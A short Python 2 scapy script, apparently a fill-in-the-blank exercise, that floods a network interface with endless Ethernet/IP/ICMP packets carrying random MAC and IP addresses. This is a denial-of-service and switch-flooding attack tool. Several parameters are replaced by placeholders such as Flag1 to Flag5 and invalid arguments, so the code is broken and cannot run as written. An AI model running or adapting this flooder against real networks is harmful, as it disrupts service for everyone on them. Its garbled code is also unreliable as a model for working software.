import sys
from scapy.all import *   

packet = Ether(src=RandMAC("*:*:*:*:*:*"),dst=RandMAC("*:*:*:*:*:*"))/IP(F1=RandIP("*.*.*.*"),F2=RandIP("*.*.*.*"))/ICMP()

#Flag1=F1.F2
if len(sys.argv) < 2:
    dev = "eth0"
else:
    dev = sys.Flag2[Flag3]    

print "Flooding net with random packets on dev " + dev    

sendp(Flag4, iface=Flag5, loop=1)